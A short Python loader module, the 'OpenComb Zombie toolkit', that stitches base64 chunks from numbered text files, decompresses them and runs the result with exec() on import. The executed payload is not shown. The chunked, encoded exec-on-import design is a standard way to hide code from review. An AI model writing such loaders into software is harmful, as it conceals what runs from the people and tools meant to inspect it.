"""OpenComb Zombie toolkit (chunked compressed loader)."""
from __future__ import annotations

import base64
import sys
import zlib
from pathlib import Path

_dir = Path(__file__).resolve().parent

def _collect(prefix: str) -> str:
    # Prefer plain _prefix_N.txt; also stitch Na/Nb if present
    parts = []
    n = 0
    while True:
        plain = _dir / f"{prefix}_{n}.txt"
        a = _dir / f"{prefix}_{n}a.txt"
        b = _dir / f"{prefix}_{n}b.txt"
        if plain.is_file():
            parts.append(plain.read_text(encoding="ascii"))
        elif a.is_file() or b.is_file():
            parts.append((a.read_text(encoding="ascii") if a.is_file() else "") + (b.read_text(encoding="ascii") if b.is_file() else ""))
        else:
            break
        n += 1
    return "".join(parts)

_b64 = _collect("_zombie_b64")
_CODE = zlib.decompress(base64.b64decode(_b64)).decode("utf-8")
_ns = globals()
_ns.setdefault("__name__", __name__)
_ns.setdefault("__file__", __file__)
sys.modules.setdefault(__name__, sys.modules.get(__name__))
exec(compile(_CODE, __file__, "exec"), _ns)
